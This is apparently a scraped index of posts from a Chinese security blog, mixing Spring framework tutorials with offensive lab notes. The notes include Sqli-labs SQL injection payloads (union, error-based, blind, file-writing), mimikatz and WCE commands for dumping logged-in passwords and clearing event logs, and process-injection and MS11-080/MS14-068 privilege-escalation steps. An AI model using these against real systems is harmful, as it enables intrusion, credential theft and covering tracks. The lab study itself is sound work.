&lt;/bean&gt;&lt;/beans&gt; 注意，在jdbc协议设置URL时，添加了参数serverTimezone值为UTC进行服务端Timezone的设置，否则会报如下错误： 1Exception in thread &quot;main&quot; org.springframework.jdbc.CannotGetJdbcConnectionException: Could not get JDBC Connection; nested exception is java.sql.SQLException: The server time zone value &apos;ÖÐ¹ú±ê×¼Ê±¼ä&apos; is unrecognized or represents more than one time zone. You must configure either the server or JDBC driver (via the serverTimezone configuration property) to use a more specifc time zone value if you want to utilize time zone support. 在执行之前，需要在数据库中执行以下SQL语句创建test数据库以及新建： 12345678CREATE DATABASE test;USE test;CREATE TABLE Student( ID INT NOT NULL AUTO_INCREMENT, NAME VARCHAR(20) NOT NULL, AGE INT NOT NULL, PRIMARY KEY (ID)); 创建成功后，运行MainApp成功使用JDBC框架实现数据库的连接使用： 查看数据库，数据被成功插入：","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"https://www.mi1k7ea.com/tags/Spring/"}]},{"title":"几个查看用户信息的Windows程序","date":"2019-01-01T14:52:11.000Z","path":"2019/01/01/几个查看用户信息的Windows程序/","text":"下面列几个Windows上常用的查看用户信息的工具。 0x01 WCE（Windows Credential Editor）在Kali中有：/usr/share/wce/ 其中有几个文件，将wce目录整个复制到Windows XP系统的C盘中，然后先增加两个用户： 通过-h参数查看相应的参数信息。 -l参数显示已经登录的账号，加个v参数更写详细： -w参数查看已经登录的用户及其登陆密码： 切换到其他用户也登录之后再执行可看到所有已登录的用户的密码 -d参数实现删除相应lid的用户： 防止别的用户查看： 在系统的注册表中删除默认启动的包wdigest（本地）、tspkg（终端），但同时系统不可以再进行多用户登陆。 在cmd中输入regedit来启动注册表，该安全包相应的路径为： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages（注意删除的时候要将空白的行也删掉，否则会报错） 0x02 fgdump即使还没登录的用户的信息也能查看得到，在Kali中的/usr/share/windows-binaries/ 拷贝进去之后，直接点击fgdump.exe会生成三个文件： 其中pwdump文件是调用pwdump程序进行查询所有用户的： 0x03 mimikatz压轴的牛逼工具，在Kali中的/usr/share/mimikatz/ 然后将其放入XP的C盘中。 在命令行中进入相应的目录，输入mimikatz.exe直接进入其框架内。 查看使用方法，输入两个冒号（::）而不是help或问号。 提升权限到debug方便后面的命令进行查看： 1privilege::debug （可以先输入privilege::来查看有哪些可输入的参数） 查看当前已经登录的账号、密码： 1sekurlsa::logonPasswords 登录其他用户后再尝试，可看到已经登录的用户的信息都能查看到： 如果将参数改为wdigest，可以看到在每个用户的显示中只会显示wdigest那一块。 Token模块里面有whoami参数，可以直接使用而不用再下载： Ts模块允许多用户进行并发登录操作。 Event模块对事件日志进行相应的操作： 通过输入eventvwr打开系统日志； Clear参数可以清除系统的安全性日志； Drop参数可使以后登录的行为都不会记录在eventvwr日志里； Misc模块里可以通过参数启动cmd、taskmgr、regedit等。","tags":[{"name":"工具","slug":"工具","permalink":"https://www.mi1k7ea.com/tags/工具/"},{"name":"Windows","slug":"Windows","permalink":"https://www.mi1k7ea.com/tags/Windows/"}]},{"title":"将Python脚本转换为exe","date":"2019-01-01T14:47:00.000Z","path":"2019/01/01/将Python脚本转换为exe/","text":"有时候，我们拿到台机子后，我们有个Python脚本但机子环境没有Python环境供运行，这时就可以将Python脚本转换为EXE可执行文件的形式来实现运行。 下载以下两个程序，并在安装有Pyhton环境的主机上进行转换： Pyinstaller：https://pypi.python.org/pypi/PyInstaller/2.1 Pywin32：https://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/ Pywin32是个exe执行文件直接执行即可，然后将Pyinstaller文件夹放置在Python环境所在的文件夹里面，为的是方便在命令行中使用..\\来返回上一级目录直接查找到Python环境所在的路径；直接调用pyinstaller.py可查看如何使用： 下面用cookies.py作为例子进行转换，输入： 1..\\python pyinstaller.py --onefile ms11-080.py –onefile参数，即生成一个文件的执行程序，将调用的外部文件等包含在里面，防止在其它主机使用时出错。","tags":[{"name":"Python","slug":"Python","permalink":"https://www.mi1k7ea.com/tags/Python/"},{"name":"Windows","slug":"Windows","permalink":"https://www.mi1k7ea.com/tags/Windows/"}]},{"title":"Sqli-labs Less1-20","date":"2019-01-01T14:43:28.000Z","path":"2019/01/01/Sqli-labs-writeup/","text":"0x01 Less1-Less10参考旧博客文章《Sqli-labs之Less1-10》，个人觉得写得还算详细。 下面补下之前遇到的坑，就是level7中payload无法往当前目录写文件的问题，后来发现是这个问题，mysql的配置文件my.ini中使用到了–secure-file-priv这个参数，这个参数的主要目的就是限制LOAD DATA INFILE或者SELECT INTO OUTFILE之类文件的目录位置： 12#To avoid warning messagessecure_file_priv=\"E:/wamp64/tmp\" 解决办法直接将其置空即可。 再发一次payload，就能在当前目录访问生成的文件了： 1http://localhost/sqli/Less-7/?id=0&apos;)) union select 1,2,group_concat(concat_ws(char(32,58,32),id,username,password)) from users into outfile &quot;E:\\\\wamp64\\\\www\\\\sqli\\\\Less-7\\\\7.txt&quot; %23 0x02 Less11打开是个登录界面，可以输入用户名和密码，尝试输入admin’： 可以看到页面直接返回显示报错信息：’666’ LIMIT 0,1’ 再在password中尝试注入： 显示报错信息：’’666’’ LIMIT 0,1’ 由此推测后台SQL语句可能为：SELECT xx FROM XX WHRER username=’admin’ and password=’666’ LIMIT 0,1; 验证一下，这里用’ and 1=1#和’ and 1=2#来组合验证是行不通的，因为这并非和前面的level一样只有一个入参，而且这里我们本来就不知道正确的用户名和密码，因此后面再加and是无法判断的，那就直接用or： 没毛病，直接上payload： 1uname=admin&amp;passwd=666&apos; union select 1,group_concat(concat_ws(char(32,58,32),id,username,password)) from users#&amp;submit=Submit 最后看下源码的SQL语句，确实和推测的差不多： 1@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\"; 0x03 Less12和level11一样的登录界面，在用户名处输入双引号后出现如下报错信息： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;666&quot;) LIMIT 0,1&apos; at line 1 推测后台SQL语句可能为：SELECT xx FROM XX WHRER username=(“admin”) and password=(“666”) LIMIT 0,1; 输入uname=admin”)&amp;passwd=666&amp;submit=Submit看到该报错信息即可验证： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;) and password=(&quot;666&quot;) LIMIT 0,1&apos; at line 1 payload： 1uname=admin&amp;passwd=666&quot;) union select 1,group_concat(concat_ws(char(32,58,32),id,username,password)) from users#&amp;submit=Submit 看下SQL语句源码： 1234// connectivity$uname='\"'.$uname.'\"';$passwd='\"'.$passwd.'\"'; @$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\"; 0x04 Less13和level12一样，只是双引号换成了单引号，查询失败返回显示错误信息，但查询成功不返回显示任何字段内容。 由此可知，是，利用和level5类似，利用基于错误的SQL语句，如下面利用报错显示出数据库名： 1&apos;) union select 1,2 from(select count(*),concat_ws(char(32,58,32),database(),floor(rand()*2))name from information_schema.tables group by name)b# 直接上payload，其中若不使用group_concat则只要改下limit 0,1的第一个参数即可遍历所有变量： 12345') union select 1,2 from(select count(*),concat(char(32,58,32),(select group_concat(table_name) from information_schema.tables where table_schema='security'),char(32,58,32),floor(rand()*2))name from information_schema.tables group by name)b#') union select 1,2 from(select count(*),concat(char(32,58,32),(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),char(32,58,32),floor(rand()*2))name from information_schema.tables group by name)b#') union select 1,2 from(select count(*),concat(char(32,58,32),(select concat_ws(char(32,58,32),id,username,password) from users limit 0,1),char(32,58,32),floor(rand()*2))name from information_schema.tables group by name)b# 看下源码，注释掉了显示代码： 12345678910111213141516171819202122232425/ connectivity @$sql=\"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; //echo '&lt;font color= \"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4&gt;'; //echo \" You Have successfully logged in \" ; echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; //echo 'Your Login name:'. $row['username']; //echo \"&lt;br&gt;\"; //echo 'Your Password:' .$row['password']; //echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; &#125; 0x05 Less14和less13原理一样，都是利用基于错误的SQL语句，只不过不是’)而是”双引号： 1uname=admin&amp;passwd=666&quot; union select 1,2 from(select count(*),concat(char(32,58,32),(select concat_ws(char(32,58,32),id,username,password) from users limit 0,1),char(32,58,32),floor(rand()*2))name from information_schema.tables group by name)b#&amp;submit=Submit 看下源码SQL语句： 123$uname='\"'.$uname.'\"';$passwd='\"'.$passwd.'\"'; @$sql=\"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1\"; 0x06 Less15测试几下，发现是基于布尔型的盲注，用单引号注入。 具体参考Less8即可，如下面用二分法爆破出DB名： 1uname=admin&amp;passwd=666&apos; or ascii(substr((select database()), 1, 1))&gt;114#&amp;submit=Submit 其他的步骤类似，不再赘述了。 看下源码，把输出都注释了： 12345678910111213141516171819202122232425// connectivity @$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; //echo '&lt;font color= \"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4&gt;'; //echo \" You Have successfully logged in\\n\\n \" ; echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; //echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; //echo 'Your Password:' .$row['password']; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; &#125; 0x07 Less16上Less15原理一致，只不过单引号变成”)注入： 1uname=admin&amp;passwd=666&quot;) or ascii(substr((select database()), 1, 1))&gt;114#&amp;submit=Submit 其他的步骤类似，不再赘述了。 看下源码，把输出都注释了： 123456789101112131415161718192021222324252627// connectivity $uname='\"'.$uname.'\"'; $passwd='\"'.$passwd.'\"'; @$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; //echo '&lt;font color= \"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4&gt;'; //echo \" You Have successfully logged in \" ; echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; //echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; //echo 'Your Password:' .$row['password']; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; &#125; 0x08 Less17这是一道UPDATE语句的SQL注入。 看界面，说是可以重置密码： 尝试在username和password中注入，发现在password中注入时会报错显示出来： 这里报错显示’admin’’。结合是重置密码的功能，可以推测出这里是UPDATE语句，从而退出后台SQL语句应该为：UPDATE users SET password=’xxx’ WHERE username=’admin’;。 验证一下，看下源码中SQL语句怎么写的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd']))&#123;//making sure uname is not injectable$uname=check_input($_POST['uname']); $passwd=$_POST['passwd'];...// connectivity @$sql=\"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result);//echo $row; if($row) &#123; //echo '&lt;font color= \"#0000ff\"&gt;'; $row1 = $row['username']; //echo 'Your Login name:'. $row1; $update=\"UPDATE users SET password = '$passwd' WHERE username='$row1'\"; mysql_query($update); echo \"&lt;br&gt;\"; if (mysql_error()) &#123; echo '&lt;font color= \"#FFFF00\" font size = 3 &gt;'; print_r(mysql_error()); echo \"&lt;/br&gt;&lt;/br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\" font size = 3 &gt;'; //echo \" You password has been successfully updated \" ; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; echo '&lt;img src=\"../images/flag1.jpg\" /&gt;'; //echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font size=\"4.5\" color=\"#FFFF00\"&gt;'; //echo \"Bug off you Silly Dumb hacker\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap1.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; &#125;&#125; 可以看到和推测的SQL语句一样，而且还看到程序对username进行了过滤，但并未过滤password。 那我们现在看看过滤函数的实现，看看能不能绕过从而实现username参数的注入： 1234567891011121314151617181920212223242526function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = \"'\" . mysql_real_escape_string($value) . \"'\"; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; 可以看到先判断参数是否为空，不为空则取前15位，然后调用get_magic_quotes_gpc()函数判断magic_quotes_gpc是否开启（返回0表示本功能关闭，返回1表示本功能打开），开启了的话（当magic_quotes_gpc打开时，所有的’(单引号)、”(双引号)、(反斜杠)和NULL(空字符)会自动转为含有反斜杠的溢出字符）就调用stripslashes()删除由addslashes()函数添加的反斜杠；接着调用ctype_digit(string)函数检查字符串中每个字符是否都是十进制数字（若是则返回TRUE，否则返回FALSE），当判断为非十进制数组时则调用mysql_real_escape_string()过滤参数。 可知，对username参数的过滤很有效，无从下手，只能对password进行注入了。 Method1——updatexml()函数函数定义： 1updatexml(xml_target,xpath_expr,new_xml) 参数 描述 xml_target 目标xml，形式类似于节点目录 xpath_expr xml的表达式（xpath格式） new_xml 用来替换的xml updatexml()函数是MySQL对xml文档数据进行查询和修改的xpath函数。 简单来说就是，用new_xml把xml_target中包含xpath_expr的部分节点（包括xml_target）替换掉。 使用该函数的注入原理是主要是利用报错返回信息。将updatexml()的xml_target和new_xml参数随便设定一个数即可。利用updatexml()获取数据的固定payload是： 1... or updatexml(1,concat(&apos;#&apos;,(select * from (select ...) a)),0) ... 注入一下payload即可显示数据库信息，其中0x2b为+号，当然可以用单引号直接括起来添加： 123uname=admin&amp;passwd=666&apos; or updatexml(1,concat(&apos;+&apos;,(select database()),&apos;+&apos;),0)#&amp;submit=Submit或uname=admin&amp;passwd=666&apos; or updatexml(1,concat(0x2b,(select database()),0x2b),0)#&amp;submit=Submit 报错显示出数据库名了，接着爆出表名吧，一开始输入如下payload虽然执行成功但没有显示报错内容： 1uname=admin&amp;passwd=666&apos; or updatexml(1,concat(0x2b,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),0x2b),0)#&amp;submit=Submit 后面测试了一番，发现将or换成and就可以了： 123或uname=admin&amp;passwd=666&apos; and updatexml(1,concat(0x2b,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),0x2b),0)#&amp;submit=Submit 然后查询列名： 1uname=admin&amp;passwd=666&apos; and updatexml(1,concat(0x2b,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;),0x2b),0)#&amp;submit=Submit 最后本该列出所以该数据库表信息的，但是报错了： 1uname=admin&amp;passwd=666&apos; and updatexml(1,concat(0x2b,(select group_concat(concat_ws(char(32,58,32),id,username,password)) from users),0x2b),0)#&amp;submit=Submit 不能先select表中的某些值，再update这个表（在同一语句中）。 解决方法：将select出的结果作为派生表再select一遍，这样就规避了错误。 注意：此问题只出现于MySQL，msSQL和Oracle不会出现此问题。 最后需要我们再加一层select查询，然后加上别名（这里示例写了test）才能正常拿到password： 1uname=admin&amp;passwd=666&apos; and updatexml(1,concat(0x2b,(select * from (select concat_ws(&apos;:&apos;,id,username,password) from users limit 0,1) test),0x2b),0)#&amp;submit=Submit 这里示例是通过limit遍历各个用户的密码，使用group_concat这里是测试不通过的。 Method2——extractvalue()函数原理和用法跟updatexml()函数几乎一样，只是少了第三个参数： 1extractvalue(xml,value) extractvalue()函数也是MySQL 5.1以后推出的对xml文档数据进行查询和修改的xpath函数。 extractvalue()的xml参数随便设定一个数。利用extractvalue()获取数据的固定payload是： 1... or extractvalue(1,concat(&apos;#&apos;,(select * from (select ....) a)))--+ 直接上payload： 1uname=admin&amp;passwd=666&apos; and extractvalue(1,concat(0x2b,(select * from (select concat_ws(&apos;:&apos;,id,username,password) from users limit 0,1) test),0x2b))#&amp;submit=Submit Method3——floor()函数报错显示数据库名： 1uname=admin&amp;passwd=666&apos; and (select 1 from (select count(*),concat(database(),&apos;:&apos;,floor(rand(0)*2))x from information_schema.tables group by x)a) #&amp;submit=Submit 接着可以使用group_concat列出所有表名： 1uname=admin&amp;passwd=666&apos; and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),&apos;:&apos;,floor(rand(0)*2))x from information_schema.tables group by x)a) #&amp;submit=Submit 列出列名： 1uname=admin&amp;passwd=666&apos; and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;),&apos;:&apos;,floor(rand(0)*2))x from information_schema.tables group by x)a) #&amp;submit=Submit 最后获取数据库信息时，通过group_concat是不成功的，只能利用limit遍历出来： 1uname=admin&amp;passwd=666&apos; and (select 1 from (select count(*),concat((select concat_ws(&apos;:&apos;,id,username,password) from users limit 0,1),&apos;:&apos;,floor(rand(0)*2))x from information_schema.tables group by x)a) #&amp;submit=Submit Method4——基于时间的盲注开始时尝试的盲注老有问题，于是参考了sqlmap是怎么注入的： 1234Type: AND/OR time-based blindTitle: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)Payload: uname=admin&amp;passwd=666&apos; AND (SELECT * FROM (SELECT(SLEEP(5)))hHwh)-- thmc&amp;submit=SubmitVector: AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR]) 可以看到，sqlmap中基于时间的盲注是基于Double Select注入，在其中结合sleep以及if来实现注入的。具体的实现如下，逐个字符猜测，当猜测正确时页面是sleep 10秒，否则马上响应： 1uname=admin&amp;passwd=666&apos; and (select * from (select(sleep(10-if(ascii(substr(database(),1,1))=115,0,10))) )mi1k7ea)#&amp;submit=Submit 这里ASCII码155对应字符s，逐个字符推出数据库名为security。 接着推出表名，ASCII码117对应字符u，这里直接推出limit 2,1为users表的开始： 1uname=admin&amp;passwd=666&apos; and (select * from (select(sleep(10-if(ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 2,1),1,1))=117,0,10))) )mi1k7ea)#&amp;submit=Submit 接着推字段，ASCII码105为字符i，这里可推出第一个字段名为id： 1uname=admin&amp;passwd=666&apos; and (select * from (select(sleep(10-if(ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),1,1))=105,0,10))) )mi1k7ea)#&amp;submit=Submit 最后就是爆表的内容了，ASCII码48为字符0，我本地的admin密码现在是0： 1uname=admin&amp;passwd=666&apos; and (select * from (select(sleep(10-if(ascii(substr((select password from users where username=&apos;admin&apos;),1,1))=48,0,10))) )mi1k7ea)#&amp;submit=Submit Method5——name_const()函数只适用于MySQL版本高于5.0.12，但又稍旧的版本。不适用于现在的5.7版本，会显示Incorrect arguments to NAME_CONST。 函数定义： 1name_const(name,value) 返回给定值，当用来产生一个结果集合列时，name_const()促使该列使用给定名称。 获取数据库名： 1666&apos; and (SELECT * FROM (SELECT name_const(database(),1),name_const(database(),1)) a) WHERE username=&apos;admin&apos;# 获取表名： 1666&apos; and (SELECT * FROM (SELECT name_const((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;security&apos;),1),name_const((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;security&apos;),1)) a)# 总的来说，对于update、delete和insert都有一个固定的结构： 1... or (select * from (select name_const((select ...),1),name_const((select ...),1)) a) ... 0x09 Less18访问页面，有个登录框和显示ip地址一栏信息： 尝试一番操作，在username和password都没有疑似SQL注入的问题。 其实本页面的标题已经提示我们是HTTP头注入了。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://www.mi1k7ea.com/tags/SQL注入/"}]},{"title":"Spring基础篇之IoC容器","date":"2019-01-01T14:40:06.000Z","path":"2019/01/01/Spring基础篇之IoC容器/","text":"0x00 参考本笔记直接参考或引自如下链接文章： https://www.w3cschool.cn/wkspring/ http://c.biancheng.net/spring/ 0x01 IoC简介Spring容器是Spring框架的核心。容器将创建对象，把它们连接在一起，配置它们，并管理他们的整个生命周期从创建到销毁。Spring容器使用依赖注入（DI）来管理组成一个应用程序的组件。这些对象被称为Spring Beans。 IoC（Inversion of Control，控制反转）是指在程序开发中，实例的创建不再由调用者管理，而是由Spring容器创建。Spring容器会负责控制程序之间的关系，而不是由程序代码直接控制，因此控制权由程序代码转移到了Spring容器中，控制权发生了反转，这就是Spring的IoC思想。 也就是说，IoC容器是一个具有依赖注入功能的容器，它可以创建对象，IoC容器负责实例化、定位、配置应用程序中的对象及建立这些对象间的依赖。通常new一个实例，控制权由程序员控制，而”控制反转”是指new实例工作不由程序员来做而是交给Spring容器来做。在Spring中BeanFactory是IOC容器的实际代表者。 通过阅读配置元数据提供的指令，容器知道对哪些对象进行实例化，配置和组装。配置元数据可以通过XML，Java注释或Java代码来表示。Spring IoC容器利用Java的POJO类和配置元数据来生成完全配置和可执行的系统或应用程序。如下图： Spring提供了两种IoC容器，分别为BeanFactory和ApplicationContext。 容器 描述 BeanFactory 最简单的容器，给依赖注入（DI）提供了基本的支持，它用org.springframework.beans.factory.BeanFactory接口来定义。BeanFactory或者相关的接口，如 BeanFactoryAware，InitializingBean，DisposableBean，在Spring中仍然存在具有大量的与Spring整合的第三方框架的反向兼容性的目的。 ApplicationContext 该容器添加了更多的企业特定的功能，例如从一个属性文件中解析文本信息的能力，发布应用程序事件给感兴趣的事件监听器的能力。该容器是由org.springframework.context.ApplicationContext接口定义。 二者的主要区别在于，如果Bean的某一个属性没有注入，则使用BeanFacotry加载后，在第一次调用getBean()方法时会抛出异常，而ApplicationContext则在初始化时自检，这样有利于检查所依赖的属性是否注入。因此，在实际开发中，通常都选择使用ApplicationContext，而只有在系统资源较少时才考虑使用BeanFactory。 0x02 BeanFactoryBeanFactory是基础类型的IoC容器，由org.springframework.beans.facytory.BeanFactory接口定义，主要的功能是为依赖注入（DI）提供支持，并提供了完整的IoC服务支持。简单来说，BeanFactory就是一个管理Bean的工厂，它主要负责初始化各种Bean，并调用它们的生命周期方法。 BeanFactory和相关的接口，比如BeanFactoryAware、DisposableBean、InitializingBean，仍旧保留在Spring中，主要目的是向后兼容已经存在的和那些Spring整合在一起的第三方框架。 BeanFactory接口有多个实现类，最常见的是org.springframework.beans.factory.xml.XmlBeanFactory，它是根据XML配置文件中的定义装配Bean的。 创建BeanFactory实例时，需要提供Spring所管理容器的详细配置信息，这些信息通常采用XML文件形式管理。其加载配置信息的代码具体如下所示： 1BeanFactory beanFactory = new XmlBeanFactory(new FileSystemResource(\"D://applicationContext.xml\")); DemoHelloWorld.java，Bean类： 12345678910111213package com.mi1k7ea;public class HelloWorld &#123; private String message; public void setMessage(String message)&#123; this.message = message; &#125; public void getMessage()&#123; System.out.println(\"Your Message : \" + message); &#125;&#125; MainApp.java： 123456789101112package com.mi1k7ea;import org.springframework.beans.factory.xml.XmlBeanFactory;import org.springframework.core.io.ClassPathResource;public class MainApp &#123; public static void main(String[] args) &#123; XmlBeanFactory factory = new XmlBeanFactory(new ClassPathResource(\"Beans.xml\")); HelloWorld obj = (HelloWorld) factory.getBean(\"helloWorld\"); obj.getMessage(); &#125;&#125; 在主程序当中，我们需要注意以下两点： 第一步利用框架提供的 XmlBeanFactory() API 去生成工厂 bean 以及利用 ClassPathResource() API 去加载在路径 CLASSPATH 下可用的 bean 配置文件。XmlBeanFactory() API 负责创建并初始化所有的对象，即在配置文件中提到的 bean。 第二步利用第一步生成的 bean 工厂对象的 getBean() 方法得到所需要的 bean。 这个方法通过配置文件中的 bean ID 来返回一个真正的对象，该对象最后可以用于实际的对象。一旦得到这个对象，你就可以利用这个对象来调用任何方法。 Beans.xml，给HelloWorld类的message属性赋值： 1234567891011&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\"&gt; &lt;bean id=\"helloWorld\" class=\"com.mi1k7ea.HelloWorld\"&gt; &lt;property name=\"message\" value=\"BeanFactory Test\"/&gt; &lt;/bean&gt;&lt;/beans&gt; 运行，输出如下： 0x03 ApplicationContextApplicationContext是BeanFactory的子接口，被称为应用上下文。Application Context是Spring中较高级的容器。和BeanFactory类似，它可以加载配置文件中定义的Bean，将所有的Bean集中在一起，当有请求的时候分配 Bean。它不仅提供了BeanFactory的所有功能，还添加了对i18n（国际化）、资源访问、事件传播等方面的良好支持。该接口的全路径为org.springframework.context.ApplicationContext。 最常被使用的 ApplicationContext 接口实现： FileSystemXmlApplicationContext：该容器从XML文件中加载已被定义的Bean。在这里，你需要提供给构造器XML文件的绝对路径； ClassPathXmlApplicationContext：该容器从XML文件中加载已被定义的Bean。无需提供XML文件的完整路径，只需正确配置CLASSPATH环境变量即可，因为容器会从CLASSPATH中搜索Bean配置文件； WebXmlApplicationContext：该容器会在一个Web应用程序的范围内加载在XML文件中已被定义的 bean； Demo以前面的例子为例，HelloWorld.java不用修改，Beans.xml的message属性值改为”ApplicationContext Test”。 MainApp.java，将IoC容器从XmlBeanFactory改为ApplicationContext，同时获取XML配置文件的方式改为调用FileSystemXmlApplicationContext，注意要绝对路径： 123456789101112package com.mi1k7ea;import org.springframework.context.ApplicationContext;import org.springframework.context.support.FileSystemXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new FileSystemXmlApplicationContext(\"E:\\xx\\\\xx\\\\SpringTest\\\\src\\\\Beans.xml\"); HelloWorld obj = (HelloWorld) context.getBean(\"helloWorld\"); obj.getMessage(); &#125;&#125; 在主程序当中，我们需要注意以下两点： 第一步生成工厂对象。加载完指定路径下 bean 配置文件后，利用框架提供的 FileSystemXmlApplicationContext API 去生成工厂 bean。FileSystemXmlApplicationContext 负责生成和初始化所有的对象，比如，所有在 XML bean 配置文件中的 bean。 第二步利用第一步生成的上下文中的 getBean() 方法得到所需要的 bean。 这个方法通过配置文件中的 bean ID 来返回一个真正的对象。一旦得到这个对象，就可以利用这个对象来调用任何方法。 输出：","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"https://www.mi1k7ea.com/tags/Spring/"}]},{"title":"注入进程和利用漏洞提权","date":"2019-01-01T14:00:48.000Z","path":"2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权/","text":"0x01 注入进程提权该方式在实现提权的同时给系统安放了后门，以便于进行隐蔽的监听。 下载pinjector.exe程序：https://www.tarasco.org/security/Process_Injector/ 然后将该程序放入system32目录中，在命令行中输入pinjector，提示有-l和-p两个参数，先输入pinjector -l 列出当前执行的进程及其相应的用户名。找到其中一个包含System用户的进程进行注入即可： 输入的端口号实现监听，可在Kali中用nc进行监听，并且可得到System用户的权限： 0x02 利用漏洞提权前面的提权都是在管理员权限下进行的，如果是普通用户则可以通过可能存在的漏洞进行提权。下面以两个漏洞举例。 MS11-080Kb2592799——关于漏洞的描述等的信息 https://technet.microsoft.com/library/security/ms11-080 在Kali中查找相应的模块，需要添加-v参数才查找得到： 1searchsploit -v ms11-080 在实验系统中，在运行中输入如下命令来查看是否打上了相应的补丁： 1appwiz.cpl 在a用户的命令行上执行Python脚本转换而来的exe执行文件，其中需要输入相应的参数： 输入whoami查看权限，可见注入成功，已提权到SYSTEM： 进一步利用，将a用户添加进管理员组，此后的登陆之后都是管理员权限： MS14-068设置域服务器： 以win server 2k3作为域控制器： 接着运行域控制器的安装，其中在安装DNS服务器时需要插入光盘，在虚拟机中插入安装时该系统的iso文件即可： 1dcpromo 以一台Win7作为连接域的主机，关于Windows系统的相关下载可以到：https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/ 先将win7主机的DNS服务器的IP改为域控制器的IP： 右键我的电脑&gt;属性&gt;Advanced system&gt;电脑名&gt;Change&gt;Domain： 填写相应的域名、域控制器管理员账号和密码后设置完成。 在运行中输入dsa.msc。 打开域管理工具，为成员赋予账号： 创建成功后即可在win7上用该账号登陆。 在win7登陆时要更换选项： （域下的账号密码都可以通过下面补充知识讲的工具来获取的。） 在Computers目录中右击目标主机点管理可以对该主机进行远程管理，当然前提是要将目标主机的防火墙关掉： 搜索MS14-068的脚本，加入参数-v后才看到有： 在域的普通用户中通过whoami /all来查看域用户对应的SID： 